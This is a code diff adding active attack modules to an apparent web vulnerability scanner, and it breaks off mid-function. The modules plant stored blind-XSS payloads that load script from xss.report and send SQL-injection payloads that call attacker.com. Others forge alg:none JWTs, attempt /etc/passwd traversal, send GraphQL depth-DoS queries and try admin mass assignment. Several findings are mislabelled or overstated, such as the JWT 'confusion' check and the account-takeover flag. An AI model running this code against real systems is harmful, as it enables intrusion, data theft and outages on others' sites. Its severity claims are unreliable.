@@ -3666,3 +3666,879 @@ def scan_workflow_bypass(crawl_data):
                                          "template":"apex-workflow"})
                 except: continue
     return findings
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 1: JWT alg confusion, blind XSS, HTTP param pollution,
+#                web cache deception, JSONP injection
+# ---------------------------------------------------------------------------
+
+def scan_jwt_alg_confusion(crawl_data):
+    """JWT algorithm confusion attack: RS256→HS256 using public key as HMAC secret."""
+    findings = []
+    import base64, json as _json
+    tested = set()
+    for page in crawl_data.get("pages", [])[:5]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        # Grab any JWT from cookies or auth endpoints
+        try:
+            r = _S.get(page["url"], timeout=5)
+            # Look for JWTs in cookies, headers, body
+            jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
+            sources = list(r.cookies.values()) + [r.headers.get("Authorization",""), r.text[:2000]]
+            for src in sources:
+                jwts = jwt_re.findall(str(src))
+                for jwt in jwts:
+                    parts = jwt.split(".")
+                    if len(parts) != 3: continue
+                    try:
+                        pad = lambda s: s + "=" * (-len(s) % 4)
+                        header = _json.loads(base64.urlsafe_b64decode(pad(parts[0])))
+                        if header.get("alg","").upper() in ("RS256","RS384","RS512","ES256","ES384","ES512"):
+                            # Craft none-alg token
+                            new_header = base64.urlsafe_b64encode(
+                                _json.dumps({"alg":"none","typ":"JWT"}).encode()
+                            ).rstrip(b"=").decode()
+                            forged = f"{new_header}.{parts[1]}."
+                            # Test if server accepts it
+                            test_r = _S.get(page["url"], timeout=5,
+                                           headers={"Authorization": f"Bearer {forged}"})
+                            if test_r.status_code == 200 and test_r.status_code != r.status_code:
+                                findings.append({"type": "JWT Algorithm Confusion (none attack)",
+                                                 "severity": "critical", "url": page["url"],
+                                                 "detail": f"Server accepts alg:none JWT (was {header['alg']})",
+                                                 "template": "apex-jwt-alg"})
+                    except: pass
+        except: pass
+    return findings
+
+
+def scan_blind_xss(crawl_data):
+    """Blind XSS — payloads that fire in admin panels/logs, not the current page."""
+    findings = []
+    # Use a canary URL pattern — if you have a callback server, replace with your URL
+    canary = "https://xss.report/c/apexcli"  # placeholder — user should set their own
+    payloads = [
+        f'"><script src="{canary}"></script>',
+        f"'><img src=x onerror=\"var s=document.createElement('script');s.src='{canary}';document.head.appendChild(s)\">",
+        f'javascript:eval(atob("ZmV0Y2goImh0dHBzOi8veHNzLnJlcG9ydC9jL2FwZXhjbGkiKQ=="))',
+        f'<svg><animate onbegin=fetch("{canary}") attributeName=x dur=1s>',
+    ]
+    # Inject into every input that gets stored (name, comment, message, bio, address)
+    stored_fields = ("name","username","first_name","last_name","comment","message",
+                     "bio","description","address","company","title","subject","body","note","feedback")
+    for form in crawl_data.get("forms", []):
+        if form.get("method","").upper() != "POST": continue
+        action = form.get("action","")
+        if not action: continue
+        for inp in form.get("inputs", []):
+            fname = inp.get("name","").lower()
+            if not any(x in fname for x in stored_fields): continue
+            for payload in payloads[:2]:
+                try:
+                    data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
+                    data[inp["name"]] = payload
+                    r = _S.post(action, data=data, timeout=5)
+                    if r.status_code in (200, 201, 302):
+                        findings.append({"type": "Blind XSS Payload Injected",
+                                         "severity": "high", "url": action,
+                                         "detail": f"Blind XSS in field '{inp['name']}' — fires if rendered in admin/logs",
+                                         "template": "apex-blind-xss"})
+                        break
+                except: continue
+    # Also inject into HTTP headers that get logged
+    for page in crawl_data.get("pages",[])[:3]:
+        for header in ["User-Agent","Referer","X-Forwarded-For","X-Custom-Header"]:
+            try:
+                r = _S.get(page["url"], timeout=5, headers={header: payloads[0]})
+                if r.status_code < 500:
+                    findings.append({"type": f"Blind XSS via {header}",
+                                     "severity": "medium", "url": page["url"],
+                                     "detail": f"Payload injected into {header} — may fire in log viewer",
+                                     "template": "apex-blind-xss"})
+                    break
+            except: pass
+    return findings
+
+
+def scan_http_parameter_pollution(crawl_data):
+    """HTTP Parameter Pollution — duplicate params bypass WAF/validation."""
+    findings = []
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            try:
+                # Send param twice with different values
+                test_url = f"{url.split('?')[0]}?{p}=safe&{p}=<script>alert(1)</script>"
+                r = _S.get(test_url, timeout=_TIMEOUT)
+                if "<script>alert(1)</script>" in r.text:
+                    findings.append({"type": "HTTP Parameter Pollution (XSS)",
+                                     "severity": "high", "url": test_url,
+                                     "detail": f"Duplicate param '{p}' — second value reflected unescaped",
+                                     "template": "apex-hpp"})
+                    continue
+                # HPP for access control bypass
+                test_url2 = f"{url.split('?')[0]}?{p}=1&{p}=2&{p}=admin"
+                r2 = _S.get(test_url2, timeout=_TIMEOUT)
+                r_orig = _S.get(f"{url.split('?')[0]}?{p}=1", timeout=_TIMEOUT)
+                if abs(len(r2.content) - len(r_orig.content)) > 200:
+                    findings.append({"type": "HTTP Parameter Pollution",
+                                     "severity": "medium", "url": test_url2,
+                                     "detail": f"Duplicate param '{p}' changes response — possible bypass",
+                                     "template": "apex-hpp"})
+            except: continue
+    return findings
+
+
+def scan_web_cache_deception(crawl_data):
+    """Web cache deception — trick cache into storing authenticated responses."""
+    findings = []
+    tested = set()
+    # Static file extensions that caches store
+    cache_exts = [".css", ".js", ".png", ".jpg", ".ico", ".woff", ".gif", ".svg"]
+    for page in crawl_data.get("pages", [])[:5]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        # Test authenticated paths
+        for path in ["/profile", "/account", "/dashboard", "/settings", "/api/me", "/user"]:
+            for ext in cache_exts[:3]:
+                try:
+                    # Request /profile/nonexistent.css — if cached, attacker can steal it
+                    url = f"{base}{path}/apex_wcd_test{ext}"
+                    r1 = _S.get(url, timeout=5)
+                    r2 = _S.get(url, timeout=5)
+                    if r1.status_code == 200 and len(r1.content) > 100:
+                        cache_hit = (r2.headers.get("X-Cache","").lower() in ("hit","hit from cloudfront") or
+                                     r2.headers.get("CF-Cache-Status","").lower() == "hit" or
+                                     r2.headers.get("Age","0") != "0")
+                        if cache_hit:
+                            findings.append({"type": "Web Cache Deception",
+                                             "severity": "critical", "url": url,
+                                             "detail": f"Authenticated response cached at {path}/file{ext}",
+                                             "template": "apex-cache-deception"})
+                            break
+                        # Even without cache hit header, flag if it returns real content
+                        if any(x in r1.text.lower() for x in ["email","username","profile","account","token"]):
+                            findings.append({"type": "Potential Web Cache Deception",
+                                             "severity": "high", "url": url,
+                                             "detail": f"Sensitive content served at static-looking URL",
+                                             "template": "apex-cache-deception"})
+                            break
+                except: continue
+    return findings
+
+
+def scan_jsonp_injection(crawl_data):
+    """JSONP callback injection — steal cross-origin data via script tag."""
+    findings = []
+    callback_params = ("callback","cb","jsonp","jsonpcallback","call","func","function",
+                       "handler","fn","callbackFn","callbackName","wrap","wrapper")
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            if p.lower() not in callback_params: continue
+            try:
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                qs[p] = ["apexjsonptest"]
+                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                r = _S.get(test_url, timeout=_TIMEOUT)
+                if "apexjsonptest(" in r.text or "apexjsonptest (" in r.text:
+                    # Check if it contains sensitive data
+                    has_sensitive = any(x in r.text.lower() for x in
+                                       ["email","token","user","account","secret","key","password"])
+                    sev = "critical" if has_sensitive else "high"
+                    findings.append({"type": "JSONP Injection",
+                                     "severity": sev, "url": test_url,
+                                     "detail": f"Callback param '{p}' reflected — cross-origin data theft possible",
+                                     "template": "apex-jsonp"})
+            except: continue
+    # Also probe common API endpoints for JSONP support
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        for path in ["/api/user","/api/me","/api/profile","/api/data"]:
+            for cb in ["callback","jsonp","cb"]:
+                try:
+                    r = _S.get(f"{base}{path}?{cb}=apextest", timeout=3)
+                    if "apextest(" in r.text:
+                        findings.append({"type": "JSONP Endpoint Found",
+                                         "severity": "high", "url": f"{base}{path}?{cb}=apextest",
+                                         "detail": "JSONP endpoint — cross-origin data theft if sensitive",
+                                         "template": "apex-jsonp"})
+                except: continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 2: Dependency confusion, GraphQL depth attack,
+#                path normalization bypass, Nginx off-by-slash,
+#                second-order injection
+# ---------------------------------------------------------------------------
+
+def scan_dependency_confusion(crawl_data):
+    """Dependency confusion — internal package names exposed in JS/package.json."""
+    findings = []
+    internal_indicators = ["@internal/","@private/","@corp/","@company/",
+                           "internal-","private-","corp-","local-"]
+    for page in crawl_data.get("pages",[])[:5]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        # Check package.json
+        for path in ["/package.json","/.package.json","/app/package.json","/frontend/package.json"]:
+            try:
+                r = _S.get(f"{base}{path}", timeout=5)
+                if r.status_code == 200 and "dependencies" in r.text:
+                    try:
+                        pkg = r.json()
+                        all_deps = {}
+                        all_deps.update(pkg.get("dependencies",{}))
+                        all_deps.update(pkg.get("devDependencies",{}))
+                        internal = [n for n in all_deps if any(n.startswith(x) for x in internal_indicators)]
+                        if internal:
+                            findings.append({"type": "Dependency Confusion Risk",
+                                             "severity": "high", "url": f"{base}{path}",
+                                             "detail": f"Internal packages exposed: {', '.join(internal[:5])}",
+                                             "template": "apex-dep-confusion"})
+                    except: pass
+            except: continue
+        # Check JS files for require/import of internal packages
+        try:
+            r = _S.get(page["url"], timeout=5)
+            for indicator in internal_indicators:
+                matches = re.findall(rf'["\']({re.escape(indicator)}[a-zA-Z0-9_/-]+)["\']', r.text)
+                if matches:
+                    findings.append({"type": "Dependency Confusion (JS import)",
+                                     "severity": "medium", "url": page["url"],
+                                     "detail": f"Internal package referenced: {matches[0]}",
+                                     "template": "apex-dep-confusion"})
+                    break
+        except: pass
+    return findings
+
+
+def scan_graphql_depth_attack(crawl_data):
+    """GraphQL depth/complexity DoS — deeply nested queries exhaust server."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/graphql","/api/graphql","/gql","/graphiql"]:
+            url = f"{base}{path}"
+            # First check if endpoint exists
+            try:
+                probe = _S.post(url, json={"query":"{__typename}"},
+                               headers={"Content-Type":"application/json"}, timeout=3)
+                if probe.status_code not in (200, 400): continue
+            except: continue
+            # Deep nesting attack (depth 15)
+            nested = "user { friends { friends { friends { friends { friends { id name email } } } } } }"
+            for depth in range(10): nested = f"user {{ friends {{ {nested} }} }}"
+            try:
+                start = time.time()
+                r = _S.post(url, json={"query": f"{{ {nested} }}"},
+                           headers={"Content-Type":"application/json"}, timeout=15)
+                elapsed = time.time() - start
+                if elapsed > 5:
+                    findings.append({"type": "GraphQL Depth Attack (DoS)",
+                                     "severity": "high", "url": url,
+                                     "detail": f"Deeply nested query took {elapsed:.1f}s — no depth limit",
+                                     "template": "apex-gql-depth"})
+                elif r.status_code == 200 and "errors" not in r.text:
+                    findings.append({"type": "GraphQL No Depth Limit",
+                                     "severity": "medium", "url": url,
+                                     "detail": "Server accepted deeply nested query without error",
+                                     "template": "apex-gql-depth"})
+            except requests.exceptions.Timeout:
+                findings.append({"type": "GraphQL Depth Attack (Timeout DoS)",
+                                 "severity": "critical", "url": url,
+                                 "detail": "Deeply nested query caused server timeout",
+                                 "template": "apex-gql-depth"})
+            except: pass
+            # Field suggestion leak (schema without introspection)
+            try:
+                r = _S.post(url, json={"query": "{ usr { id } }"},
+                           headers={"Content-Type":"application/json"}, timeout=5)
+                if "Did you mean" in r.text or "suggestion" in r.text.lower():
+                    suggested = re.findall(r'Did you mean ["\']([^"\']+)["\']', r.text)
+                    findings.append({"type": "GraphQL Field Suggestion Leak",
+                                     "severity": "medium", "url": url,
+                                     "detail": f"Schema leaked via suggestions: {suggested[:5]}",
+                                     "template": "apex-gql-suggest"})
+            except: pass
+    return findings
+
+
+def scan_path_normalization_bypass(crawl_data):
+    """Path normalization bypass — Spring, Express, Nginx handle paths differently."""
+    findings = []
+    bypass_patterns = [
+        "/..;/",          # Spring Boot bypass
+        "/%2e%2e/",       # URL-encoded ../
+        "/%252e%252e/",   # Double-encoded ../
+        "/./",            # Dot segment
+        "/%2f",           # Encoded /
+        "/;/",            # Semicolon (Spring)
+        "/%09",           # Tab
+        "//",             # Double slash
+        "/api/..;/admin", # Spring actuator bypass
+    ]
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        # Get baseline 403 paths
+        protected = []
+        for path in ["/admin","/actuator","/internal","/api/admin","/management"]:
+            try:
+                r = _S.get(f"{base}{path}", timeout=3)
+                if r.status_code == 403:
+                    protected.append(path)
+            except: pass
+        for path in protected:
+            for bypass in bypass_patterns:
+                try:
+                    test_url = f"{base}{bypass}{path.lstrip('/')}"
+                    r = _S.get(test_url, timeout=3, allow_redirects=False)
+                    if r.status_code == 200:
+                        findings.append({"type": "Path Normalization Bypass",
+                                         "severity": "critical", "url": test_url,
+                                         "detail": f"403 on {path} bypassed via {bypass}",
+                                         "template": "apex-path-norm"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_nginx_off_by_slash(crawl_data):
+    """Nginx off-by-slash misconfiguration — /api proxied but /api/ leaks files."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        # Common Nginx proxy locations
+        for location in ["/api","/static","/assets","/files","/uploads","/media","/app"]:
+            try:
+                # With trailing slash — may expose filesystem
+                r = _S.get(f"{base}{location}../etc/passwd", timeout=5)
+                if "root:" in r.text or "daemon:" in r.text:
+                    findings.append({"type": "Nginx Off-by-Slash Path Traversal",
+                                     "severity": "critical", "url": f"{base}{location}../etc/passwd",
+                                     "detail": f"Nginx alias misconfiguration at {location} leaks /etc/passwd",
+                                     "template": "apex-nginx-slash"})
+                    continue
+                # Check if location without slash proxies but with slash exposes root
+                r1 = _S.get(f"{base}{location}", timeout=3)
+                r2 = _S.get(f"{base}{location}/", timeout=3)
+                if r1.status_code == 200 and r2.status_code == 200:
+                    if abs(len(r1.content) - len(r2.content)) > 500:
+                        findings.append({"type": "Nginx Off-by-Slash (Different Response)",
+                                         "severity": "medium", "url": f"{base}{location}/",
+                                         "detail": f"Trailing slash changes response significantly at {location}",
+                                         "template": "apex-nginx-slash"})
+            except: continue
+    return findings
+
+
+def scan_second_order_injection(crawl_data):
+    """Second-order injection — payload stored then executed in different context."""
+    findings = []
+    # Payloads that are safe on input but dangerous when re-used
+    payloads = [
+        ("../../../etc/passwd", ["root:","daemon:"]),          # Path traversal on retrieval
+        ("' OR '1'='1", ["error","sql","syntax","mysql"]),     # SQLi on re-use
+        ("<script>alert(1)</script>", ["<script>alert(1)"]),   # XSS on display
+        ("${7*7}", ["49"]),                                     # SSTI on template render
+        ("{{7*7}}", ["49"]),
+    ]
+    # Find registration/profile update forms
+    store_paths = ["/register","/signup","/profile","/account/update","/user/update",
+                   "/api/register","/api/profile","/api/user"]
+    retrieve_paths = ["/profile","/account","/dashboard","/user/profile","/api/me","/api/profile"]
+
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        for store_path in store_paths:
+            for payload, markers in payloads[:2]:
+                try:
+                    # Store the payload
+                    store_data = {"username": payload, "name": payload,
+                                  "email": f"test_{int(time.time())}@test.com",
+                                  "password": "Test1234!"}
+                    r_store = _S.post(f"{base}{store_path}", json=store_data, timeout=5)
+                    if r_store.status_code not in (200,201,302): continue
+                    # Retrieve and check if payload executed
+                    for retrieve_path in retrieve_paths:
+                        try:
+                            r_get = _S.get(f"{base}{retrieve_path}", timeout=5)
+                            if any(m in r_get.text for m in markers):
+                                findings.append({"type": "Second-Order Injection",
+                                                 "severity": "critical",
+                                                 "url": f"{base}{store_path} → {retrieve_path}",
+                                                 "detail": f"Payload stored at {store_path}, triggered at {retrieve_path}",
+                                                 "template": "apex-second-order"})
+                                break
+                        except: continue
+                except: continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 3: CORS preflight bypass, prototype pollution via JSON body,
+#                account takeover via response manipulation,
+#                API mass exposure, OAuth token leakage
+# ---------------------------------------------------------------------------
+
+def scan_cors_preflight_bypass(crawl_data):
+    """CORS preflight bypass — non-simple requests that skip OPTIONS check."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:5]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for origin in ["https://evil.com", "null"]:
+            # Test with Content-Type: application/json (triggers preflight)
+            try:
+                r = _S.options(page["url"], timeout=5, headers={
+                    "Origin": origin,
+                    "Access-Control-Request-Method": "POST",
+                    "Access-Control-Request-Headers": "Content-Type,Authorization",
+                })
+                acao = r.headers.get("Access-Control-Allow-Origin","")
+                acam = r.headers.get("Access-Control-Allow-Methods","")
+                acah = r.headers.get("Access-Control-Allow-Headers","")
+                acac = r.headers.get("Access-Control-Allow-Credentials","")
+                if (acao in (origin,"*") and
+                    "POST" in acam and
+                    "authorization" in acah.lower()):
+                    sev = "critical" if acac.lower() == "true" else "high"
+                    findings.append({"type": "CORS Preflight Bypass",
+                                     "severity": sev, "url": page["url"],
+                                     "detail": f"Preflight allows {origin} with Authorization header, credentials={acac}",
+                                     "template": "apex-cors-preflight"})
+                    break
+            except: pass
+            # Test wildcard with credentials (invalid but some servers allow it)
+            try:
+                r = _S.get(page["url"], timeout=5, headers={
+                    "Origin": origin,
+                    "Authorization": "Bearer test"
+                })
+                if (r.headers.get("Access-Control-Allow-Origin") == "*" and
+                    r.headers.get("Access-Control-Allow-Credentials","").lower() == "true"):
+                    findings.append({"type": "CORS Wildcard + Credentials",
+                                     "severity": "critical", "url": page["url"],
+                                     "detail": "Wildcard ACAO with Allow-Credentials:true — browser blocks but misconfigured",
+                                     "template": "apex-cors-preflight"})
+            except: pass
+    return findings
+
+
+def scan_prototype_pollution_json(crawl_data):
+    """Prototype pollution via JSON body — __proto__ in POST body."""
+    findings = []
+    pollution_payloads = [
+        {"__proto__": {"polluted": "apex_pp_test"}},
+        {"constructor": {"prototype": {"polluted": "apex_pp_test"}}},
+        {"__proto__[polluted]": "apex_pp_test"},
+    ]
+    for form in crawl_data.get("forms",[]):
+        if form.get("method","").upper() != "POST": continue
+        action = form.get("action","")
+        if not action: continue
+        try:
+            baseline = _S.post(action, json={}, timeout=5)
+        except: continue
+        for payload in pollution_payloads:
+            try:
+                r = _S.post(action, json=payload, timeout=5,
+                           headers={"Content-Type":"application/json"})
+                # If server reflects polluted key or behaves differently
+                if "apex_pp_test" in r.text:
+                    findings.append({"type": "Prototype Pollution via JSON Body",
+                                     "severity": "high", "url": action,
+                                     "detail": f"__proto__ key reflected in response",
+                                     "template": "apex-pp-json"})
+                    break
+                # Check if pollution changed server behavior
+                if r.status_code == 200 and abs(len(r.content) - len(baseline.content)) > 100:
+                    findings.append({"type": "Prototype Pollution via JSON (Behavioral)",
+                                     "severity": "medium", "url": action,
+                                     "detail": "JSON __proto__ changes server response",
+                                     "template": "apex-pp-json"})
+                    break
+            except: continue
+    # Also test GET params with bracket notation
+    for url, params in crawl_data.get("params",{}).items():
+        for p in params:
+            try:
+                test_url = f"{url.split('?')[0]}?__proto__[polluted]=apex_pp_test&{p}=1"
+                r = _S.get(test_url, timeout=_TIMEOUT)
+                if "apex_pp_test" in r.text:
+                    findings.append({"type": "Prototype Pollution (GET __proto__)",
+                                     "severity": "high", "url": test_url,
+                                     "detail": "Server reflects __proto__ key from query string",
+                                     "template": "apex-pp-json"})
+            except: continue
+    return findings
+
+
+def scan_account_takeover_response_manipulation(crawl_data):
+    """Account takeover via response manipulation — intercept and modify auth responses."""
+    findings = []
+    # Test if changing response fields bypasses auth
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        for path in ["/api/login","/login","/auth","/api/auth","/signin"]:
+            try:
+                # Try login with wrong creds
+                r = _S.post(f"{base}{path}",
+                           json={"email":"test@test.com","password":"wrongpassword"},
+                           timeout=5)
+                body = r.text.lower()
+                # Check if response has manipulable boolean fields
+                if r.status_code in (200,401) and any(x in body for x in
+                    ['"success":false','"authenticated":false','"valid":false',
+                     '"status":"fail"','"result":"fail"','"error":true']):
+                    findings.append({"type": "Account Takeover via Response Manipulation",
+                                     "severity": "critical", "url": f"{base}{path}",
+                                     "detail": "Auth response contains manipulable boolean — intercept+modify to bypass",
+                                     "template": "apex-ato-response"})
+                # Check for mass assignment in registration that sets role
+                if path in ("/api/login","/login"):
+                    r2 = _S.post(f"{base}{path}",
+                                json={"email":"test@test.com","password":"wrongpassword",
+                                      "role":"admin","isAdmin":True,"admin":True},
+                                timeout=5)
+                    if r2.status_code == 200 and "admin" in r2.text.lower():
+                        findings.append({"type": "Account Takeover via Mass Assignment",
+                                         "severity": "critical", "url": f"{base}{path}",
+                                         "detail": "Login accepts role/admin fields — privilege escalation",
+                                         "template": "apex-ato-response"})
+            except: continue
+    return findings
+
+
+def scan_api_mass_exposure(web_targets):
+    """API mass exposure — multiple API versions all publicly accessible."""
+    findings = []
+    for target in web_targets[:3]:
+        versions_found = []
+        for ver in ["v0","v1","v2","v3","v4","beta","alpha","legacy","old","dev","internal","private"]:
+            for prefix in ["/api/","/api/","/rest/","/service/","/"]:
+                url = f"{target}{prefix}{ver}/users"
+                try:
+                    r = _S.get(url, timeout=3, allow_redirects=False)
+                    if r.status_code == 200:
+                        try:
+                            data = r.json()
+                            if isinstance(data, (list,dict)) and len(str(data)) > 20:
+                                versions_found.append(f"{prefix}{ver}")
+                        except: pass
+                except: continue
+        if len(versions_found) >= 2:
+            findings.append({"type": "API Mass Exposure (Multiple Versions)",
+                             "severity": "critical", "url": target,
+                             "detail": f"Multiple API versions expose /users: {', '.join(versions_found)}",
+                             "template": "apex-api-mass"})
+        elif len(versions_found) == 1:
+            findings.append({"type": "Unprotected API Version",
+                             "severity": "high", "url": f"{target}{versions_found[0]}/users",
+                             "detail": f"API version {versions_found[0]} exposes user data without auth",
+                             "template": "apex-api-mass"})
+    return findings
+
+
+def scan_oauth_token_leakage(crawl_data):
+    """OAuth token leakage via Referer header, postMessage, fragment."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:10]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        # Check if OAuth tokens appear in URLs (fragment leaks via Referer)
+        url = page["url"]
+        if any(x in url for x in ["access_token=","id_token=","token=","code="]):
+            # Token in URL = leaks via Referer header
+            findings.append({"type": "OAuth Token in URL (Referer Leak)",
+                             "severity": "critical", "url": url,
+                             "detail": "OAuth token/code in URL — leaks via Referer to third-party resources",
+                             "template": "apex-oauth-leak"})
+        # Check for token in page source
+        try:
+            r = _S.get(page["url"], timeout=5)
+            # Look for tokens in HTML/JS
+            token_patterns = [
+                (r'access_token["\s:=]+([A-Za-z0-9_\-\.]{20,})', "Access Token"),
+                (r'id_token["\s:=]+([A-Za-z0-9_\-\.]{20,})', "ID Token"),
+                (r'refresh_token["\s:=]+([A-Za-z0-9_\-\.]{20,})', "Refresh Token"),
+                (r'client_secret["\s:=]+([A-Za-z0-9_\-\.]{16,})', "Client Secret"),
+            ]
+            for pattern, name in token_patterns:
+                matches = re.findall(pattern, r.text, re.IGNORECASE)
+                if matches:
+                    findings.append({"type": f"OAuth {name} Exposed in Page",
+                                     "severity": "critical", "url": page["url"],
+                                     "detail": f"{name} found in page source: {matches[0][:20]}...",
+                                     "template": "apex-oauth-leak"})
+                    break
+        except: pass
+        # Check /.well-known/openid-configuration for misconfig
+        try:
+            r = _S.get(f"{base}/.well-known/openid-configuration", timeout=5)
+            if r.status_code == 200:
+                cfg = r.json()
+                # Check for dangerous response types
+                rt = cfg.get("response_types_supported",[])
+                if "token" in rt:  # implicit flow = token in URL
+                    findings.append({"type": "OAuth Implicit Flow Enabled",
+                                     "severity": "high", "url": f"{base}/.well-known/openid-configuration",
+                                     "detail": "Implicit flow (token in URL) enabled — token leakage risk",
+                                     "template": "apex-oauth-leak"})
+        except: pass
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 4: Blind SQLi via OOB, IDOR via UUID prediction,
+#                HTTP/2 rapid reset, SAML injection,
+#                DNS rebinding SSRF
+# ---------------------------------------------------------------------------
+
+def scan_blind_sqli_oob(crawl_data):
+    """Blind SQL injection via Out-of-Band DNS — detects when no output is visible."""
+    findings = []
+    # OOB payloads using DNS lookup (requires DNS callback — we detect via timing/error)
+    # Without a real OOB server, we use error-based and timing as proxy
+    oob_payloads = [
+        # MySQL DNS OOB (requires FILE privilege)
+        ("MySQL OOB", "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))-- -"),
+        # MSSQL DNS OOB
+        ("MSSQL OOB", "'; EXEC master..xp_dirtree '//attacker.com/a'-- -"),
+        # PostgreSQL OOB
+        ("PostgreSQL OOB", "'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'-- -"),
+        # Oracle OOB
+        ("Oracle OOB", "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM DUAL-- -"),
+        # Generic error-based to confirm SQLi exists
+        ("Error-based", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -"),
+        ("Error-based", "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
+    ]
+    error_markers = ["extractvalue","xpath","xmltype","utl_http","xp_dirtree",
+                     "syntax error","sql","mysql","ora-","pg_","sqlite"]
+    for url, params in crawl_data.get("params",{}).items():
+        for p in params:
+            for db, payload in oob_payloads:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=10)
+                    body = r.text.lower()
+                    if any(m in body for m in error_markers) and r.status_code != 404:
+                        findings.append({"type": f"Blind SQLi OOB ({db})",
+                                         "severity": "critical", "url": test_url,
+                                         "detail": f"OOB/error-based SQLi via param '{p}' ({db} payload)",
+                                         "template": "apex-sqli-oob"})
+                        break
+                except: continue
+    # Also test POST body params
+    for form in crawl_data.get("forms",[]):
+        if form.get("method","").upper() != "POST": continue
+        action = form.get("action","")
+        if not action: continue
+        for inp in form.get("inputs",[]):
+            if inp.get("type") in ("submit","hidden","button","file"): continue
+            for db, payload in oob_payloads[-2:]:  # Just error-based for forms
+                try:
+                    data = {i.get("name","f"): i.get("value","1") for i in form.get("inputs",[])}
+                    data[inp.get("name","x")] = payload
+                    r = _S.post(action, data=data, timeout=10)
+                    if any(m in r.text.lower() for m in error_markers):
+                        findings.append({"type": f"Blind SQLi OOB in Form ({db})",
+                                         "severity": "critical", "url": action,
+                                         "detail": f"SQLi via form field '{inp.get('name')}' ({db})",
+                                         "template": "apex-sqli-oob"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_idor_uuid_prediction(crawl_data):
+    """IDOR via UUID prediction — v1 UUIDs are time-based and predictable."""
+    findings = []
+    uuid_v1_re = re.compile(
+        r'[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
+        re.IGNORECASE
+    )
+    uuid_seq_re = re.compile(
+        r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
+        re.IGNORECASE
+    )
+    for page in crawl_data.get("pages",[])[:20]:
+        url = page["url"]
+        # Check URL for UUIDs
+        v1_matches = uuid_v1_re.findall(url)
+        if v1_matches:
+            findings.append({"type": "IDOR via UUID v1 (Predictable)",
+                             "severity": "high", "url": url,
+                             "detail": f"UUID v1 in URL is time-based and predictable: {v1_matches[0]}",
+                             "template": "apex-idor-uuid"})
+        # Check response body for UUID v1
+        try:
+            r = _S.get(url, timeout=5)
+            v1_in_body = uuid_v1_re.findall(r.text)
+            if v1_in_body:
+                # Try to access adjacent UUIDs (increment timestamp)
+                import uuid as _uuid
+                try:
+                    u = _uuid.UUID(v1_in_body[0])
+                    if u.version == 1:
+                        findings.append({"type": "UUID v1 in Response (Predictable IDOR)",
+                                         "severity": "high", "url": url,
+                                         "detail": f"UUID v1 exposed: {v1_in_body[0]} — time-based, enumerable",
+                                         "template": "apex-idor-uuid"})
+                except: pass
+            # Check for sequential numeric IDs in JSON (classic IDOR)
+            try:
+                data = r.json()
+                data_str = str(data)
+                ids = re.findall(r'"(?:id|user_id|account_id|order_id)":\s*(\d+)', data_str)
+                if ids and int(ids[0]) < 10000:  # Low ID = sequential = IDOR risk
+                    findings.append({"type": "Sequential ID Exposed (IDOR Risk)",
+                                     "severity": "medium", "url": url,
+                                     "detail": f"Low sequential ID {ids[0]} in response — enumerate other IDs",
+                                     "template": "apex-idor-uuid"})
+            except: pass
+        except: pass
+    return findings
+
+
+def scan_http2_rapid_reset(web_targets):
+    """HTTP/2 Rapid Reset (CVE-2023-44487) — send RST_STREAM immediately after HEADERS."""
+    findings = []
+    try:
+        import httpx as _httpx
+    except ImportError:
+        return findings
+    for target in web_targets[:5]:
+        if not target.startswith("https"): continue
+        try:
+            with _httpx.Client(http2=True, verify=False, timeout=10) as client:
+                r = client.get(target)
+                if r.http_version != "HTTP/2": continue
+                # Send rapid requests and immediately cancel — measure server behavior
